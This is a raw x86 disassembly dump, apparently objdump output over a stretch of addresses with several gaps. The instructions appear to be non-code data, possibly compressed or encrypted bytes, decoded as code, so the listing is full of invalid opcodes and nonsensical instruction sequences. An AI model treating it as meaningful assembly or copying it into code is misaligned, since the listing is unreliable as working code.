  41c6ce:	mov    al,0x86
  41c6d0:	jmp    DWORD PTR [edx+0x1a70979a]
  41c6d6:	sbb    DWORD PTR [ecx-0x6bfc02ac],esp
  41c6dc:	out    0x84,eax
  41c6de:	jne    0x41c6f5
  41c6e0:	pmaxub mm5,mm3
  41c6e3:	das    
  41c6e4:	and    bh,al
  41c6e6:	lock outs dx,DWORD PTR ds:[esi]
  41c6e8:	mov    WORD PTR [ecx+eiz*1],cs
  41c6eb:	enterw 0xe6eb,0x4
  41c6f0:	add    DWORD PTR [ebx-0x79fc2149],edx
  41c6f6:	iret   
  41c6f7:	imul   ebx,edx,0xfffffff8
  41c6fa:	fiadd  DWORD PTR [edx+0x4cb8964f]
  41c700:	xor    DWORD PTR ds:0xbeb4c6d2,ecx
  41c706:	(bad)  
  41c707:	fsub   DWORD PTR [eax-0x10534030]
  41c70d:	adc    DWORD PTR [edx],ecx
  41c70f:	ret    0x6bc4
  41c712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c713:	jl     0x41c6c9
  41c715:	mov    edx,0xfca884c8
  41c71a:	sar    BYTE PTR [esi+0x28aa812c],0x63
  41c721:	push   ss
  41c722:	xlat   BYTE PTR ds:[ebx]
  41c723:	xlat   BYTE PTR ds:[ebx]
  41c724:	xchg   esi,eax
  41c725:	aas    
  41c726:	and    DWORD PTR [ebx+0x2ab983e],esi
  41c72c:	push   edi
  41c72d:	mov    cl,0x69
  41c72f:	aad    0x8a
  41c731:	push   ebx
  41c732:	push   ecx
  41c733:	repz inc ebx
  41c735:	icebp  
  41c736:	int3   
  41c737:	gs xchg edx,eax
  41c739:	mov    al,ds:0x4e1108dd
  41c73e:	push   ecx
  41c73f:	jmp    0x52ca:0x738e4ef
  41c746:	aas    
  41c747:	jl     0x41c6ec
  41c749:	mov    edx,0xca7d0249
  41c74e:	pusha  
  41c74f:	mov    dh,BYTE PTR [ebx+0x23]
  41c752:	pop    ecx
  41c753:	pop    ebp
  41c754:	sti    
  41c755:	and    edx,edi
  41c757:	xchg   ebp,eax
  41c758:	sub    edx,esp
  41c75a:	sub    al,0xee
  41c75c:	fwait
  41c75d:	add    edx,DWORD PTR [edx]
  41c75f:	pop    eax
  41c760:	pop    ds
  41c761:	push   ds
  41c762:	cdq    
  41c763:	stc    
  41c764:	ror    ebp,1
  41c766:	adc    dh,BYTE PTR [ebx]
  41c768:	scas   al,BYTE PTR es:[edi]
  41c769:	mov    edi,0xfe814b
	...
  41c7d6:	fiadd  DWORD PTR [ecx]
  41c7d8:	ret    0xdb86
  41c7db:	(bad)  
  41c7dc:	ficomp WORD PTR [ebp-0xf]
  41c7df:	cmp    DWORD PTR [esi],esi
  41c7e1:	lahf   
  41c7e2:	idiv   DWORD PTR [eax]
  41c7e4:	adc    BYTE PTR [edx+0xc],0x32
  41c7e8:	add    DWORD PTR [eax],eax
  41c7ea:	inc    DWORD PTR [eax]
  41c7ec:	add    BYTE PTR [eax],al
  41c7ee:	push   ebx
  41c7ef:	push   esp
  41c7f0:	out    0x30,al
  41c7f2:	or     eax,0x5b8130c9
  41c7f7:	ficomp DWORD PTR [edi-0x3e]
  41c7fa:	test   al,0x56
  41c7fc:	lock lahf 
  41c7fe:	cmc    
  41c7ff:	pop    ecx
  41c800:	mov    ebp,gs
  41c802:	cmp    eax,0x21025b3b
  41c807:	mov    ebx,0x96f3cf09
  41c80c:	outs   dx,DWORD PTR ds:[esi]
  41c80d:	scas   al,BYTE PTR es:[edi]
  41c80e:	mov    cl,0x88
  41c810:	push   esp
  41c811:	pop    edi
  41c812:	jp     0x41c7a8
  41c814:	or     DWORD PTR [ecx+ebx*8],0x1e35c6f2
  41c81b:	cmp    al,0x2
  41c81d:	std    
  41c81e:	pop    ecx
  41c81f:	pop    esp
  41c820:	ds loop 0x41c856
  41c823:	pop    es
  41c824:	jl     0x41c7c5
  41c826:	bound  esi,QWORD PTR [ebx+0x6fc6cbb]
  41c82c:	cli    
  41c82d:	push   esi
  41c82e:	aaa    
  41c82f:	add    ch,BYTE PTR [ebx-0x3a4a7f6f]
  41c835:	cli    
  41c836:	add    eax,0xe6c91cd
  41c83b:	loopne 0x41c82d
  41c83d:	inc    esp
  41c83e:	push   ecx
  41c83f:	jae    0x41c81e
  41c841:	pusha  
  41c842:	sbb    al,0xfc
  41c844:	ror    BYTE PTR [edi-0x1644241a],cl
  41c84a:	or     dh,cl
  41c84c:	(bad)  
  41c84d:	adc    bl,BYTE PTR [ebx+0x58]
  41c850:	in     eax,dx
  41c851:	icebp  
  41c852:	rol    ecx,cl
  41c854:	pushf  
  41c855:	mov    dl,BYTE PTR [esi+0x5c135e16]
  41c85b:	sti    
  41c85c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c85d:	imul   ebx,DWORD PTR [edx-0x1bcf0f06],0x2d
  41c864:	call   0xa753e8df
  41c869:	xchg   esi,eax
  41c86a:	ins    BYTE PTR es:[edi],dx
  41c86b:	dec    edx
  41c86c:	test   BYTE PTR [ecx-0x24f8ca80],dh
  41c872:	sbb    eax,0xe895d32b
  41c877:	cld    
  41c878:	push   0xa048cc09
  41c87d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c87e:	inc    eax
  41c87f:	mov    ah,0x46
  41c881:	arpl   si,cx
  41c883:	sub    dh,BYTE PTR [ebp-0x7060cc7c]
  41c889:	or     esp,DWORD PTR [esi+0x395fc349]
  41c88f:	jmp    DWORD PTR [ebx-0x6f0f046f]
  41c895:	test   DWORD PTR [ecx-0x5a57b9b2],eax
  41c89b:	mov    ebp,0x1cde73cb
  41c8a0:	xchg   BYTE PTR [edx+0x23],cl
  41c8a3:	mov    eax,0x121b8226
  41c8a8:	mov    ds:0x9ec252e9,al
  41c8ad:	adc    eax,0xb6e57d02
  41c8b2:	mov    cl,0x9d
  41c8b4:	adc    eax,0xd5e4415d
  41c8b9:	or     DWORD PTR [edx+ebx*2-0x44],ebp
  41c8bd:	add    DWORD PTR ds:0xa88bef44,edx
  41c8c3:	int3   
  41c8c4:	sbb    bh,bh
  41c8c6:	fs daa 
  41c8c8:	ds jg  0x41c90d
  41c8cb:	mov    ds:0xc1ac5d9e,al
  41c8d0:	adc    DWORD PTR [edx+0x4df8d629],ecx
  41c8d6:	lock cld 
  41c8d8:	and    bh,BYTE PTR [ecx-0x22]
  41c8db:	and    DWORD PTR [edi-0x4d776d21],ebp
  41c8e1:	in     eax,dx
  41c8e2:	and    al,0x67
  41c8e4:	adc    al,0x2
  41c8e6:	dec    esi
  41c8e7:	bound  edi,QWORD PTR [esi+0x6398edea]
	...
  41c955:	add    BYTE PTR [ebx+0x34],ah
  41c958:	lods   eax,DWORD PTR ds:[esi]
  41c959:	xor    al,0xff
  41c95b:	mov    ebp,0x291877fb
  41c960:	cmp    eax,DWORD PTR [ecx]
  41c962:	cmp    eax,0xb27fd6f
  41c967:	xor    eax,DWORD PTR [ecx]
  41c969:	add    bh,bh
  41c96b:	add    BYTE PTR [eax],al
  41c96d:	add    ch,bh
  41c96f:	push   esp
  41c970:	inc    ecx
  41c971:	xchg   ecx,eax
  41c972:	ja     0x41c970
  41c974:	sbb    bh,BYTE PTR [esi+edi*4]
  41c977:	push   cs
  41c978:	xor    ecx,eax
  41c97a:	inc    edx
  41c97b:	cdq    
  41c97c:	mov    ah,BYTE PTR [ebp-0x582fa15b]
  41c982:	sub    esp,DWORD PTR [esi]
  41c984:	(bad)  
  41c985:	ror    DWORD PTR [ecx],cl
  41c987:	jno    0x41c98c
  41c989:	xchg   ecx,eax
  41c98a:	mov    fs,WORD PTR [ebx+edx*1]
  41c98d:	(bad)  [ebp+0x6f2fae8e]
  41c993:	outs   dx,BYTE PTR ds:[esi]
  41c994:	ja     0x41ca04
  41c996:	jecxz  0x41c9aa
  41c998:	xor    bl,BYTE PTR [edx]
  41c99a:	and    al,0x6d
  41c99c:	pusha  
  41c99d:	push   cs
  41c99e:	push   eax
  41c99f:	push   edi
  41c9a0:	mov    esi,0x72d44dcf
  41c9a5:	add    dl,BYTE PTR [eax]
  41c9a7:	inc    esi
  41c9a8:	aaa    
  41c9a9:	dec    ebp
  41c9aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9ab:	aaa    
  41c9ac:	add    ch,BYTE PTR [ebx+ecx*8]
  41c9af:	aam    0x37
  41c9b1:	in     al,0x7e
  41c9b3:	jl     0x41c9be
  41c9b5:	mov    esi,0x52df3682
  41c9ba:	aas    
  41c9bb:	loopne 0x41c9bd
  41c9bd:	adc    DWORD PTR [ebp+ebx*4-0x50],edx
  41c9c1:	jne    0x41c95a
  41c9c3:	mov    ah,0xc2
  41c9c5:	pop    edi
  41c9c6:	push   ebp
  41c9c7:	pusha  
  41c9c8:	and    bl,BYTE PTR [edx+eiz*4+0x74]
  41c9cc:	clc    
  41c9cd:	mov    al,ds:0x7ba4fcf0
  41c9d2:	xor    DWORD PTR [ecx+0x42b26979],esi
  41c9d8:	mov    al,ah
  41c9da:	push   ebp
  41c9db:	inc    ecx
  41c9dc:	lock xchg edi,eax
  41c9de:	pop    es
  41c9df:	xlat   BYTE PTR ds:[ebx]
  41c9e0:	rcr    DWORD PTR [ecx+0x23c12d94],0x9e
  41c9e7:	clc    
  41c9e8:	imul   eax,DWORD PTR [edx],0x63
  41c9eb:	sub    BYTE PTR [eax+0x6],dh
  41c9ee:	cmp    BYTE PTR fs:[ebx-0x5962f5b],0xc9
  41c9f6:	adc    ecx,DWORD PTR [edx]
  41c9f8:	push   es
  41c9f9:	and    bl,ah
  41c9fb:	jmp    0x41ac:0xda11d5b1
  41ca02:	jge    0x41ca2f
  41ca04:	sahf   
  41ca05:	adc    BYTE PTR [eax],0xd1
  41ca08:	inc    ebx
  41ca09:	xor    bl,BYTE PTR [ebp+0x58]
  41ca0c:	jae    0x41c995
  41ca0e:	add    dh,BYTE PTR [edi+0x61975190]
  41ca14:	adc    edx,DWORD PTR [ebp+0x22]
  41ca17:	cmp    DWORD PTR [ebp+0x62],eax
  41ca1a:	push   ebp
  41ca1b:	lock out dx,eax
  41ca1d:	jmp    0x6946:0x99184cbd
  41ca24:	imul   eax,DWORD PTR [eax+0x68d3ddcd],0xffffff90
  41ca2b:	ss out dx,eax
  41ca2d:	mov    DWORD PTR [esi-0xa],eax
  41ca30:	rcl    cl,0xe2
  41ca33:	popf   
  41ca34:	xor    eax,0xb2dbe53d
  41ca39:	test   eax,0x2f414995
  41ca3e:	jecxz  0x41ca04
  41ca40:	and    eax,0x9923a5c6
  41ca45:	pop    edi
  41ca46:	xchg   esi,eax
  41ca47:	imul   edx,DWORD PTR [ecx+0x5bf397d7],0x56
  41ca4e:	repz pop ebp
  41ca50:	or     BYTE PTR [ecx+0x4],ah
  41ca53:	(bad)  
  41ca54:	out    dx,al
  41ca55:	sbb    DWORD PTR [esi-0xc2a322a],0x1de32bf0
  41ca5f:	aaa    
  41ca60:	fild   QWORD PTR [ebp-0x60]
  41ca63:	jle    0x41ca54
  41ca65:	shr    ah,1
  41ca67:	pop    ds
  41ca68:	pop    esp
  41ca69:	stos   DWORD PTR es:[edi],eax
  41ca6a:	jp     0x41ca9e
  41ca6c:	repz add BYTE PTR [eax],al
	...
  41cad3:	add    BYTE PTR [eax],al
  41cad5:	add    al,dh
  41cad7:	retf   0xfc94
  41cada:	mov    esi,0xc1cef8fe
  41cadf:	or     al,BYTE PTR [ebx+0x0]
  41cae2:	addr16 mov edi,edi
  41cae5:	dec    ecx
  41cae6:	or     dh,BYTE PTR [ecx+eax*1]
  41cae9:	add    bh,bh
  41caeb:	add    BYTE PTR [eax],al
  41caed:	add    BYTE PTR [ecx+0x79],dh
  41caf0:	jge    0x41ca92
  41caf2:	cwde   
  41caf3:	push   ecx
  41caf4:	out    0xd,al
  41caf6:	jle    0x41cb1b
  41caf8:	pop    es
  41caf9:	mov    ebp,0x7fb283a8
  41cafe:	add    bh,cl
  41cb00:	add    DWORD PTR [esi+edx*2+0x39de03fa],esi
  41cb07:	enter  0xd4d,0xc5
  41cb0b:	push   ds
  41cb0c:	xchg   ebp,eax
  41cb0d:	int    0x9e
  41cb0f:	jnp    0x41cb12
  41cb11:	test   eax,0x4881940b
  41cb16:	add    edi,0x5692562
  41cb1c:	mov    dl,0x3a
  41cb1e:	inc    eax
  41cb1f:	dec    edx
  41cb20:	push   ebx
  41cb21:	mov    esp,0xe58d4cf8
  41cb26:	xor    eax,0x541a2790
  41cb2b:	push   edx
  41cb2c:	adc    BYTE PTR [edi+0x25],0xd0
  41cb30:	lds    esp,FWORD PTR [eax+0x6b]
  41cb33:	imul   edx,edi,0x7d
  41cb36:	in     eax,dx
  41cb37:	mov    DWORD PTR [edx-0x6bb64afc],ebp
  41cb3d:	ins    BYTE PTR es:[edi],dx
  41cb3e:	pop    ebp
  41cb3f:	repz xchg ebx,eax
  41cb41:	mov    edi,0xf09d8ee1
  41cb46:	call   0x2f68:0xe2cb645a
  41cb4d:	inc    esi
  41cb4e:	in     eax,dx
  41cb4f:	pop    esi
  41cb50:	and    ebp,DWORD PTR [edx]
  41cb52:	xchg   BYTE PTR [edx],dh
  41cb54:	inc    esi
  41cb55:	cs cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb58:	iret   
  41cb59:	ins    DWORD PTR es:[edi],dx
  41cb5a:	mov    edi,0xcab24d24
  41cb5f:	or     BYTE PTR [ebp+0x6f],0xca
  41cb63:	xchg   DWORD PTR [edx],esp
  41cb65:	cmp    eax,0xe2bd6bc0
  41cb6a:	xchg   BYTE PTR [edi],ah
  41cb6c:	jmp    0x41cb18
  41cb6e:	cmp    DWORD PTR [edx],eax
  41cb70:	adc    ah,BYTE PTR [esi-0x13]
  41cb73:	pop    eax
  41cb74:	xor    DWORD PTR [ecx],eax
  41cb76:	fisub  DWORD PTR [esi]
  41cb78:	jp     0x41cbcc
  41cb7a:	popf   
  41cb7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb7c:	xchg   esi,eax
  41cb7d:	adc    ecx,DWORD PTR [ecx-0x10]
  41cb80:	jl     0x41cb16
  41cb82:	fiadd  WORD PTR ds:0xffc4c80a
  41cb88:	sti    
  41cb89:	push   ds
  41cb8a:	in     al,dx
  41cb8b:	adc    bh,BYTE PTR [ebp+0x1d004c07]
  41cb91:	scas   eax,DWORD PTR es:[edi]
  41cb92:	je     0x41cb9e
  41cb94:	adc    BYTE PTR [edi+ebp*1+0x68e49b5d],bl
  41cb9b:	mov    DWORD PTR [esi+edx*8-0x3c],ebx
  41cb9f:	push   es
  41cba0:	loopne 0x41cb99
  41cba2:	fdiv   QWORD PTR [edi-0x2aa7a04d]
  41cba8:	test   ebx,edx
  41cbaa:	push   0x1c
  41cbac:	xchg   esp,eax
  41cbad:	call   0xa55660ac
  41cbb2:	call   0x9917:0x99496d74
  41cbb9:	pop    ebp
  41cbba:	clc    
  41cbbb:	outs   dx,BYTE PTR ds:[esi]
  41cbbc:	pop    ebx
  41cbbd:	std    
  41cbbe:	and    DWORD PTR [esi],esi
  41cbc0:	test   al,0x8f
  41cbc2:	out    dx,eax
  41cbc3:	sbb    DWORD PTR [eax],esi
  41cbc5:	cld    
  41cbc6:	or     al,0x3f
  41cbc8:	nop
  41cbc9:	pushf  
  41cbca:	mov    bl,0x78
  41cbcc:	scas   al,BYTE PTR es:[edi]
  41cbcd:	adc    esp,DWORD PTR [edi-0x54]
  41cbd0:	out    dx,eax
  41cbd1:	and    DWORD PTR [edi-0x2cd3c2a5],edi
  41cbd7:	rol    bl,0xf6
  41cbda:	xchg   edx,eax
  41cbdb:	sbb    al,0xdd
  41cbdd:	xor    al,0x33
  41cbdf:	xor    eax,0xc86514b2
  41cbe4:	cmp    eax,DWORD PTR ds:0x72b52e6a
  41cbea:	cmp    BYTE PTR [edi+0x1f],ch
	...
  41cc55:	add    BYTE PTR [ecx],ch
  41cc57:	(bad)  
  41cc58:	sti    
  41cc59:	pop    ebp
  41cc5a:	(bad)  
  41cc5b:	jge    0x41cc0c
  41cc5d:	neg    cl
  41cc5f:	hlt    
  41cc60:	add    eax,0xb6cd2d22
  41cc65:	test   eax,0x13509
  41cc6a:	inc    DWORD PTR [eax]
  41cc6c:	add    BYTE PTR [eax],al
  41cc6e:	xor    al,0x5a
  41cc70:	xchg   edx,eax
  41cc71:	ja     0x41cc8d
  41cc73:	stc    
  41cc74:	repz gs lahf 
  41cc77:	jg     0x41ccb2
  41cc79:	repnz cmp ebx,DWORD PTR [ebx+0x71]
  41cc7d:	add    DWORD PTR [esi],eax
  41cc7f:	jb     0x41cc35
  41cc81:	jl     0x41ccb8
  41cc83:	and    al,0xc
  41cc85:	pop    ebp
  41cc86:	or     eax,0x87c31468
  41cc8b:	outs   dx,DWORD PTR ds:[esi]
  41cc8c:	and    BYTE PTR [ecx-0x12],0xcf
  41cc90:	sub    eax,0x94d22e5e
  41cc95:	pusha  
  41cc96:	lahf   
  41cc97:	or     al,0xc2
  41cc99:	mov    ds:0x77491898,eax
  41cc9e:	and    al,0xbf
  41cca0:	in     eax,dx
  41cca1:	int    0x69
  41cca3:	pop    esi
  41cca4:	dec    ebp
  41cca5:	ret    0xf51e
  41cca8:	mov    dl,0x45
  41ccaa:	popf   
  41ccab:	pop    eax
  41ccac:	out    dx,al
  41ccad:	aad    0xd8
  41ccaf:	cmp    si,WORD PTR [eax+0x76ffbadb]
  41ccb6:	pop    ss
  41ccb7:	mov    bl,0xee
  41ccb9:	fldcw  WORD PTR [edx+0x357501c8]
  41ccbf:	mov    ebx,0x3d24761
  41ccc4:	jae    0x41cc59
  41ccc6:	(bad)
  41ccc9:	jge    0x41ccdc
  41cccb:	jns    0x41cd06
  41cccd:	and    BYTE PTR [ebp-0x34],0xf7
  41ccd1:	in     eax,dx
  41ccd2:	adc    al,0xc3
  41ccd4:	mov    edi,ebp
  41ccd6:	shl    edi,cl
  41ccd8:	(bad)  [ebx]
  41ccda:	dec    BYTE PTR ds:0xb7aef31e
  41cce0:	(bad)  
  41cce1:	add    esp,edx
  41cce3:	repnz das 
  41cce5:	(bad)  
  41cce6:	aaa    
  41cce7:	(bad)  [ebp+0x17383a4b]
  41cced:	int3   
  41ccee:	fisttp DWORD PTR [edi+edi*8]
  41ccf1:	or     ch,BYTE PTR [edi]
  41ccf3:	fst    DWORD PTR [edx+0x3de1e87e]
  41ccf9:	and    edi,eax
  41ccfb:	mov    ch,0x2d
  41ccfd:	jmp    0x41cc8b
  41ccff:	mov    edi,0xf6442a2
  41cd04:	and    DWORD PTR es:0xd1db1af0,eax
  41cd0b:	dec    edx
  41cd0c:	(bad)  
  41cd0d:	bnd jge 0x41cc93
  41cd10:	shr    DWORD PTR [esi+0x17c4dc6],1
  41cd16:	push   0x566ef43
  41cd1b:	hlt    
  41cd1c:	and    dh,BYTE PTR [edx+0xd]
  41cd1f:	cmp    eax,0xd987b225
  41cd24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd25:	ss fadd st,st(5)
  41cd28:	rcl    ah,1
  41cd2a:	xor    dl,bh
  41cd2c:	push   es
  41cd2d:	push   ecx
  41cd2e:	mov    ds:0xdd849c4a,eax
  41cd33:	sub    dh,ch
  41cd35:	ins    BYTE PTR es:[edi],dx
  41cd36:	sub    eax,0x3886e41a
  41cd3b:	jbe    0x41ccfc
  41cd3d:	mov    edi,0x85b803b4
  41cd42:	rol    DWORD PTR [edi-0x1c],cl
  41cd45:	fimul  WORD PTR [edi-0x5b]
  41cd48:	push   es
  41cd49:	aad    0x4c
  41cd4b:	push   ds
  41cd4c:	enter  0x8951,0xe0
  41cd50:	mov    al,0xfd
  41cd52:	jle    0x41cd60
  41cd54:	iret   
  41cd55:	in     eax,dx
  41cd56:	test   al,0x81
  41cd58:	popa   
  41cd59:	test   eax,0x174c5caf
  41cd5e:	addr16 repz add eax,edi
  41cd62:	sbb    DWORD PTR [edi+0x3a58b1c4],0x42
  41cd69:	(bad)  
  41cd6a:	in     eax,0xf6
  41cd6c:	inc    eax
	...
  41cdd5:	add    BYTE PTR [eax-0x67],ah
  41cdd8:	fsubr  st(5),st
  41cdda:	std    
  41cddb:	in     eax,0x79
  41cddd:	popf   
  41cdde:	in     al,dx
  41cddf:	stc    
  41cde0:	jmp    0x41ce12
  41cde2:	xchg   ecx,eax
  41cde3:	sub    DWORD PTR [ebp-0x4],esp
  41cde6:	or     BYTE PTR [esi],dh
  41cde8:	add    DWORD PTR [eax],eax
  41cdea:	inc    DWORD PTR [eax]
  41cdec:	add    BYTE PTR [eax],al
  41cdee:	std    
  41cdef:	retf   0x684
  41cdf2:	cdq    
  41cdf3:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41cdf5:	ficom  DWORD PTR [eax]
  41cdf7:	push   cs
  41cdf8:	jmp    DWORD PTR ss:0xd0f829ba
  41cdff:	push   ebx
  41ce00:	pinsrw mm2,WORD PTR [eax-0x5c204d78],0x6d
  41ce08:	xchg   DWORD PTR [edi],ebx
  41ce0a:	jmp    0x41ce53
  41ce0c:	push   esp
  41ce0d:	sbb    DWORD PTR [esi+ebx*2-0x66],ebp
  41ce11:	addr16 push edx
  41ce13:	in     eax,dx
  41ce14:	test   al,0x1c
  41ce16:	fcom   QWORD PTR [edx+edx*8-0x5b]
  41ce1a:	sbb    ch,BYTE PTR [ebx+0x4775ddb7]
  41ce20:	ret    0xcd57
  41ce23:	push   edi
  41ce24:	test   eax,0x438ae313
  41ce29:	sbb    DWORD PTR [ebp-0x727f9527],ebx
  41ce2f:	(bad)  
  41ce31:	popa   
  41ce32:	shl    DWORD PTR [eax+0x28b7b5b5],1
  41ce38:	inc    ebp
  41ce39:	sbb    al,0x1a
  41ce3b:	sahf   
  41ce3c:	sar    DWORD PTR [ebx+ebx*2+0x6a9f4aad],0x8e
  41ce44:	int    0xff
  41ce46:	ss pushf 
  41ce48:	fild   WORD PTR [eiz*2+0x58e8c31c]
  41ce4f:	sbb    eax,0x70b77503
  41ce54:	je     0x41ce2d
  41ce56:	jmp    0xa65d:0xbaf949a
  41ce5d:	or     eax,0x16c209d9
  41ce62:	adc    esp,DWORD PTR [eax+0x6afcd257]
  41ce68:	jl     0x41cec0
  41ce6a:	mov    ecx,0x2579c842
  41ce6f:	xchg   ecx,eax
  41ce70:	je     0x41ceb7
  41ce72:	adc    DWORD PTR ss:[esp+esi*2-0x13],0xffffffe0
  41ce78:	pushf  
  41ce79:	inc    eax
  41ce7a:	mov    dh,0xe9
  41ce7c:	shl    al,0x9c
  41ce7f:	out    0x9e,eax
  41ce81:	repz jnp 0x41ceab
  41ce84:	push   edx
  41ce85:	in     al,dx
  41ce86:	mov    cs,WORD PTR [edi-0x7cae612e]
  41ce8c:	cmp    ebx,DWORD PTR [edx+0x31aea8e]
  41ce92:	loop   0x41cee5
  41ce94:	push   0xd6b1b6e9
  41ce99:	xchg   edi,eax
  41ce9a:	(bad)  
  41ce9b:	(bad)  
  41ce9d:	push   edx
  41ce9e:	pop    ebx
  41ce9f:	pop    ecx
  41cea0:	fnstsw WORD PTR [edi]
  41cea2:	inc    esi
  41cea3:	push   ebx
  41cea4:	nop
  41cea5:	push   0x7b
  41cea7:	cmp    al,0x39
  41cea9:	jge    0x41cef6
  41ceab:	stos   BYTE PTR es:[edi],al
  41ceac:	jg     0x41ce72
  41ceae:	leave  
  41ceaf:	dec    esi
  41ceb0:	xchg   BYTE PTR [esi-0x1d],bl
  41ceb3:	scas   al,BYTE PTR es:[edi]
  41ceb4:	stos   DWORD PTR es:[edi],eax
  41ceb5:	(bad)  
  41ceb6:	pop    ss
  41ceb7:	push   esp
  41ceb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ceb9:	call   0x65799aab
  41cebe:	outs   dx,DWORD PTR ds:[esi]
  41cebf:	mov    ds:0x4073c6c9,eax
  41cec4:	ror    BYTE PTR [ebx],1
  41cec6:	repz mov esi,0xcdd9c170
  41cecc:	aad    0x88
  41cece:	mov    eax,0xf1106944
  41ced3:	mov    fs,edi
  41ced5:	ret    
  41ced6:	mov    ah,0x38
  41ced8:	jne    0x41ce9b
  41ceda:	outs   dx,DWORD PTR ds:[esi]
  41cedb:	aad    0x94
  41cedd:	mov    edi,0x851b1a94
  41cee2:	xlat   BYTE PTR ds:[ebx]
  41cee3:	cmp    eax,0xd52f00fa
  41cee8:	lahf   
  41cee9:	cmc    
  41ceea:	pusha  
  41ceeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ceec:	mov    ecx,0x0
	...
  41cf55:	add    BYTE PTR [edi],al
  41cf57:	jp     0x41cf41
  41cf59:	jnp    0x41cf58
  41cf5b:	sti    
  41cf5c:	xchg   edi,eax
  41cf5d:	jle    0x41cfa6
  41cf5f:	jp     0x41cf3b
  41cf61:	lods   al,BYTE PTR ds:[esi]
  41cf62:	les    ebp,FWORD PTR [ecx]
  41cf64:	loope  0x41cf6b
  41cf66:	pop    es
  41cf67:	aaa    
  41cf68:	add    DWORD PTR [eax],eax
  41cf6a:	inc    DWORD PTR [eax]
  41cf6c:	add    BYTE PTR [eax],al
  41cf6e:	cmp    edi,DWORD PTR [edi+eiz*1-0x3c]
  41cf72:	mov    al,0x54
  41cf74:	arpl   si,bx
  41cf76:	es dec esi
  41cf78:	pop    ebx
  41cf79:	mov    bl,0xed
  41cf7b:	lock call 0xb2ffc8b5
  41cf81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf82:	pop    edi
  41cf83:	retf   
  41cf84:	out    0xc1,eax
  41cf86:	cmp    al,0x5
  41cf88:	xchg   BYTE PTR [eax-0x59],dl
  41cf8b:	imul   edx,DWORD PTR [ecx],0x898a3210
  41cf91:	mov    ds:0x32a6e76e,eax
  41cf96:	int    0x71
  41cf98:	pop    edx
  41cf99:	mov    ds:0xe7d6bab1,al
  41cf9e:	xchg   edi,eax
  41cf9f:	lods   al,BYTE PTR ds:[esi]
  41cfa0:	pop    ebx
  41cfa1:	jo     0x41cfdb
  41cfa3:	or     eax,0xa6621a04
  41cfa8:	pop    esp
  41cfa9:	pop    ecx
  41cfaa:	icebp  
  41cfab:	and    DWORD PTR [ecx+0x5c],esp
  41cfae:	or     esi,esi
  41cfb0:	jns    0x41cfb6
  41cfb2:	mov    al,0x8c
  41cfb4:	imul   eax,DWORD PTR [ebp+ecx*4-0xc],0xffffffc8
  41cfb9:	sahf   
  41cfba:	sti    
  41cfbb:	(bad)  
  41cfbc:	cld    
  41cfbd:	push   ecx
  41cfbe:	inc    esi
  41cfbf:	lahf   
  41cfc0:	or     esi,DWORD PTR [ebp+0x81dfde6]
  41cfc6:	sbb    BYTE PTR [esi-0x7f],0x3f
  41cfca:	mov    edi,0x796c98db
  41cfcf:	icebp  
  41cfd0:	jno    0x41cf66
  41cfd2:	enter  0xbb1f,0x26
  41cfd6:	add    bl,BYTE PTR [ecx-0x54]
  41cfd9:	outs   dx,DWORD PTR ds:[esi]
  41cfda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfdb:	jge    0x41cfca
  41cfdd:	xchg   ebx,eax
  41cfde:	adc    esi,edx
  41cfe0:	outs   dx,DWORD PTR ds:[esi]
  41cfe1:	gs scas al,BYTE PTR es:[edi]
  41cfe3:	imul   dl
  41cfe5:	xchg   edi,eax
  41cfe6:	ss push ebx
  41cfe8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfe9:	pop    edi
  41cfea:	aaa    
  41cfeb:	and    edx,edi
  41cfed:	das    
  41cfee:	jp     0x41d060
  41cff0:	inc    esi
  41cff1:	jmp    0x41d06a
  41cff3:	jge    0x41d01e
  41cff5:	loope  0x41d006
  41cff7:	add    DWORD PTR [eax+0x33],ecx
  41cffa:	pop    edi
  41cffb:	les    eax,FWORD PTR [eax-0x74]
  41cffe:	mov    bh,0x7b
  41d000:	(bad)  
  41d002:	les    edi,FWORD PTR [ebp+0x4180cfdf]
  41d008:	mov    ebp,0x6ee9cfb4
  41d00d:	test   ch,dl
  41d00f:	dec    ebx
  41d010:	sahf   
  41d011:	div    DWORD PTR [eax]
  41d013:	cmc    
  41d014:	lahf   
  41d015:	and    dl,ch
  41d017:	sub    BYTE PTR [ebp+0x64f7b8c2],0xc8
  41d01e:	clc    
  41d01f:	cmp    ch,BYTE PTR [eax-0x3cff7126]
  41d025:	call   0xbe3cbf2d
  41d02a:	or     ch,al
  41d02c:	int    0x9c
  41d02e:	cdq    
  41d02f:	adc    eax,0xefb201c8
  41d034:	adc    eax,0xb2daa38e
  41d039:	aaa    
  41d03a:	stc    
  41d03b:	pop    ss
  41d03c:	xchg   esp,eax
  41d03d:	ret    0xda8c
  41d040:	sbb    dh,ah
  41d042:	popa   
  41d043:	pop    es
  41d044:	push   cs
  41d045:	retf   
  41d046:	test   dl,bl
  41d048:	mov    ds:0xde1155f,al
  41d04d:	loop   0x41cfe5
  41d04f:	loopne 0x41d040
  41d051:	les    ebp,FWORD PTR [esi+0x6690a9c6]
  41d057:	xchg   DWORD PTR [ecx-0x28],ebx
  41d05a:	inc    ebp
  41d05b:	xchg   esi,eax
  41d05c:	xor    ecx,DWORD PTR [eax+edx*1]
  41d05f:	and    BYTE PTR [esp+ecx*8],bl
  41d062:	pop    esp
  41d063:	jge    0x41d048
  41d065:	jp     0x41d038
  41d067:	retf   
  41d068:	xchg   ebx,eax
  41d069:	jecxz  0x41cfeb
  41d06b:	sub    ch,bl
	...
  41d0d5:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41d0db:	push   edi
  41d0dc:	sti    
  41d0dd:	dec    BYTE PTR [esi-0x1b]
  41d0e0:	mov    ebp,0xb36d58bd
  41d0e5:	mov    ebp,0x13806
